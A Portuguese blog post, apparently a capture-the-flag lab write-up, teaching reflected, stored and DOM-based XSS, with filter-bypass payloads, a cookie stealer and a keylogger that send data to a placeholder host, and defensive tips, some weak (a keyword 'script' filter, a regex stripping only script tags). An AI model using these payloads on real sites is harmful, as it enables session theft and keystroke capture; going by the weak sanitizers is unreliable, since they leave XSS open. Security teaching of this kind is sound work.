---
title: XSS e HTML Injection - Tipos e Exploração
description: 'Entendendo Cross-Site Scripting: Reflected, Stored e DOM-based XSS com exemplos práticos'
author: matheus
tags: ["XSS", "web security", "javascript", "vulnerability", "pentesting", "Stored XSS", "Reflected XSS", "DOM-based XSS", "HTML Injection"]
categories: ["SecLab", "Hacking", "Way of Security"]
pin: false
comments: true

---

## Entendendo XSS na prática: Reflected, Stored e DOM-based

Se você já tentou fazer um input numa página web e viu seu texto aparecer na tela, provavelmente passou pela cabeça: "e se eu puder alterar o HTML ou botar um JavaScript aqui?". Bem, essa curiosidade é exatamente o que leva ao XSS - Cross-Site Scripting.

## O que é XSS?

XSS é quando conseguimos injetar código JavaScript numa aplicação web e fazer ele rodar no navegador de outras pessoas. Parece simples, mas as consequências são gigantes:

- **Roubo de cookies/sessões** - Pegar login de outras pessoas
- **Keylogger** - Capturar tudo que a vítima digita
- **Phishing** - Criar formulários falsos na própria página
- **Redirecionamentos** - Mandar a pessoa pra site malicioso
- **Defacement** - Modificar completamente a aparência do site

O mais insidioso é que a vítima vê a URL original do site, então confia completamente.

## Reflected XSS - O clássico

**Como funciona:** O servidor "reflete" de volta exatamente o que você enviou, sem filtrar nada. É tipo um espelho - você manda algo, ele mostra de volta na página.

### Exemplo prático

Imagina uma página de pesquisa simples:

```html
<!-- index.html -->
<form method="GET">
    <input type="text" name="q" placeholder="Pesquisar...">
    <input type="submit" value="Buscar">
</form>
```

```php
<!-- PHP no topo do arquivo -->
<?php
if (isset($_GET['q']) && !empty($_GET['q'])) {
    echo "Você pesquisou por: " . $_GET['q'];
}
?>
```

**Testando a vulnerabilidade:**

Primeiro, vamos ver se aceita HTML:
```url
?q=<b>teste em negrito</b>
```

Se aparecer **teste em negrito**, temos HTML injection. Agora o passo natural:

```url
?q=<script>alert("XSS funcionando!")</script>
```

**Bypass de filtros básicos:**

Quando você testa XSS e o site bloqueia certas palavras, é hora de ser criativo. Vou explicar cada técnica:

**1. Fechando tags existentes:**
```html
?q="><script>alert('bypass')</script>
```
Isso funciona porque muitas vezes seu input vai parar dentro de um atributo HTML tipo `<input value="SEU_INPUT">`. Quando você coloca `">`, você fecha o atributo e a tag, podendo inserir HTML novo. É como "escapar" do contexto atual.

**2. Usando event handlers em tags válidas:**
```html
?q=<img src=x onerror="alert('imagem com erro')">
```
O `onerror` dispara quando a imagem não carrega (e `src=x` obviamente não vai carregar). Funciona mesmo se bloquearem `<script>`.

**3. SVG com JavaScript:**
```html
?q=<svg onload="alert('svg carregado')">
```
O SVG é HTML válido e o `onload` executa assim que o elemento carrega. Muitos filtros esquecem do SVG.

**4. Outras técnicas que já usei:**
```html
<!-- Se bloquearem aspas -->
?q=<script>alert(/XSS/)</script>

<!-- Se bloquearem "alert" -->
?q=<script>confirm('XSS')</script>

<!-- Usando JavaScript: protocol -->
?q=<a href="javascript:alert('XSS')">clique</a>

<!-- Body onload -->
?q=<body onload="alert('XSS')">
```

### Explorando na prática

No container de teste (10.10.0.3), encontrei um formulário de contato que refletia dados na URL:

```
http://10.10.0.3/contact?message=<script>alert('XSS_R3fl3ct3d_34sy')</script>
```

**Resultado:** Flag capturada! `CS{XSS_R3fl3ct3d_34sy}`

**Roubo de sessão via cookie:**

```javascript
// Criar cookie de teste no F12
document.cookie = "sessao=dados_secretos"

// Payload para roubar
<script>alert(document.cookie)</script>

// Enviando para servidor malicioso
<script>
fetch('http://meuservidor.com/roubar.php?cookie=' + document.cookie)
</script>
```

**A pegadinha do Reflected XSS:** Você precisa fazer a vítima clicar no seu link malicioso. Por isso funciona bem em phishing - "Clica aqui pra ver sua fatura" e o link tem a payload XSS. A vítima clica, a página executa seu JavaScript, e você rouba a sessão dela.

## Stored XSS - O persistente

**Como funciona:** Sua payload fica salva no servidor (banco de dados, arquivo, etc) e executa toda vez que alguém acessa a página.

### Por que é mais perigoso?

Storedo XSS é como plantar uma bomba que explode em todo mundo que passa perto:

- **Sem engenharia social** - Você não precisa convencer ninguém a clicar em nada suspeito
- **Atinge todos** - Todo mundo que visita a página é afetado automaticamente
- **Persistente** - Sua payload fica lá funcionando 24/7 até alguém descobrir e remover
- **Escala real** - Se for um site popular, você pode afetar milhares de pessoas

É tipo a diferença entre atirar numa pessoa (reflected) vs envenenar o fornecimento de água da cidade (stored).

### Exemplo prático

Testei num comment box que salvava mensagens no servidor:

```html
<!-- Primeiro teste: HTML injection -->
<b>Comentário em negrito</b>
```

Não funcionou imediatamente, mas ao dar F5 (quando o backend puxou do banco), apareceu em negrito. Confirmado: temos HTML injection.

```html
<!-- Escalando para JavaScript -->
<script>alert('Stored XSS funcionando!')</script>
```

Agora qualquer pessoa que acessar essa página vai ter o script executando automaticamente.

**Resultado:** Flag capturada! `CS{XSS_St0r3d_l1k3_4_b0ss}`

**Diferença técnica:** O backend armazena nossa payload e serve ela pra todos os visitantes, não apenas reflete de volta.

## DOM-based XSS - O invisível

**Como funciona:** A vulnerabilidade está no JavaScript do frontend, não no backend. O servidor nunca vê a payload.

### Por que DOM-based é diferente?

DOM-based XSS é como um assaltante que entra pela janela enquanto todo mundo está vigiando a porta da frente:

- **Backend cego** - O servidor nem sabe que tem JavaScript malicioso rodando
- **Manipulação direta** - O próprio JavaScript da página processa seus dados e se sabota
- **Invisível nos logs** - Não deixa rastro no servidor, só no navegador da vítima
- **Mais difícil de encontrar** - Ferramentas de scanner não detectam facilmente

Basicamente, você usa o próprio código JavaScript da página contra ela mesma.

### Encontrando DOM XSS no container

Testei no container DOME com um campo de pesquisa que mostrava:
```text
0 resultados para 'teste'
```

Inspecionando o código, vi que o "teste" nem aparecia no HTML fonte. Era JavaScript fazendo isso:

```javascript
// Código vulnerável encontrado
function pesquisar(termo) {
    var pesquisa = new URLSearchParams(window.location.search);
    if (pesquisa.get('q')) {
        document.getElementById('resultado').innerHTML = 
            "0 resultados para '" + pesquisa.get('q') + "'";
    }
}
```

O problema está no `innerHTML` sem sanitização.

**Testando HTML injection:**
```html
?q=<b style="color: red">texto vermelho</b>
```

Funcionou! Agora JavaScript:
```html
?q=<script>alert('DOM XSS funcionando!')</script>
```

**Resultado:** Flag capturada! `CS{XSS_D0M_B4s3d}`

**Diferença técnica:** O frontend manipula o DOM diretamente baseado nos parâmetros da URL, sem enviar nada pro servidor.

## Payloads que realmente funcionam

Depois de testar XSS em dezenas de sites diferentes, aqui estão os payloads que mais uso. Cada um tem sua especialidade:

### Básicos para teste

```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
```

### Bypass de filtros

```html
// Se bloquear "script"
<img src=x onerror="alert('bypass')">

// Se bloquear "alert"
<script>confirm('bypass')</script>

// Se bloquear aspas
<script>alert(/XSS/)</script>

// Encoding
<script>alert(String.fromCharCode(88,83,83))</script>

// Event handlers
<input onfocus="alert('XSS')" autofocus>
```

### Cookie stealer

```javascript
<script>
var cookie = document.cookie;
var img = new Image();
img.src = "http://meuservidor.com/roubar.php?cookie=" + cookie;
</script>
```

### Keylogger básico

```javascript
<script>
document.addEventListener('keypress', function(e) {
    var img = new Image();
    img.src = "http://meuservidor.com/keys.php?key=" + e.key;
});
</script>
```

### Redirecionamento

```javascript
<script>
window.location = "http://sitemalicioso.com";
</script>
```

## Como não virar vítima (Proteção)

Agora que você entende como XSS funciona, vamos falar de como se defender. Não adianta só saber atacar - é importante proteger também.

### No backend (PHP exemplo)

```php
// Sanitização básica
$input = htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');

// Validação mais rigorosa
$input = strip_tags($_GET['q']);

// Filtro personalizado
if (strpos($_GET['q'], 'script') !== false) {
    die('Conteúdo bloqueado');
}
```

### Content Security Policy (CSP)

```html
<!-- Bloquear scripts inline -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">

<!-- Mais restritivo -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'">
```

### No JavaScript

```javascript
// Ao invés de innerHTML
element.textContent = dadosDoUsuario;

// Sanitização manual
function sanitizar(input) {
    return input.replace(/<script.*?>.*?<\/script>/gi, '');
}
```

## Arsenal para testar XSS

Estas são as ferramentas que eu realmente uso (não é só lista de Wikipedia):

- **Burp Suite** - O canivete suíço. Intercepta e modifica requisições em tempo real
- **XSSer** - Scanner automático que testa centenas de payloads diferentes
- **BeEF** - Framework para controlar navegadores comprometidos (muito sinistro)
- **OWASP ZAP** - Alternativa gratuita ao Burp, ótima para começar
- **Browser F12** - Nunca subestime as ferramentas do desenvolvedor do navegador

## Labs para praticar sem quebrar a lei

Esses são os playgrounds onde você pode testar à vontade:

- **DVWA** - Damn Vulnerable Web Application (meu favorito para começar)
- **WebGoat** - Labs oficiais da OWASP, muito didáticos
- **XSS Game** - Desafio interativo do Google (vicia!)
- **bWAPP** - Buggy Web Application com vários níveis
- **PortSwigger Academy** - Labs gratuitos da galera do Burp Suite

## O que você precisa lembrar

**Reflected XSS:** O site "cospe" de volta o que você mandou → Precisa convencer a vítima a clicar  
**Stored XSS:** Sua bomba fica plantada no servidor → Explode em todo mundo que visita  
**DOM-based XSS:** O próprio JavaScript da página se sabota → Servidor nem percebe  

**A regra de ouro:** Se você conseguir injetar HTML (tipo `<b>negrito</b>`), provavelmente consegue injetar JavaScript também. É só questão de criatividade para burlar os filtros.

**Dica de ouro:** Sempre teste primeiro com HTML simples. Se funcionar, escalade para JavaScript. Se não funcionar, não perca tempo com payloads complexos.

**Flags capturadas nos testes:**

- Reflected: `CS{XSS_R3fl3ct3d_34sy}`
- Stored: `CS{XSS_St0r3d_l1k3_4_b0ss}`
- DOM-based: `CS{XSS_D0M_B4s3d}`

Lembre-se: XSS é sobre fazer o navegador da vítima executar código que você controlou. Uma vez que você entende isso, as possibilidades são infinitas.

**Mas com grandes poderes vem grandes responsabilidades.** Use esse conhecimento para:

- Proteger seus próprios projetos
- Fazer pentests autorizados
- Educar outros desenvolvedores
- Reportar vulnerabilidades de forma responsável

Nunca para atacar sites sem permissão. Além de crime, é desncessário - tem muito lab legal para praticar.

Agora é só partir para a prática!
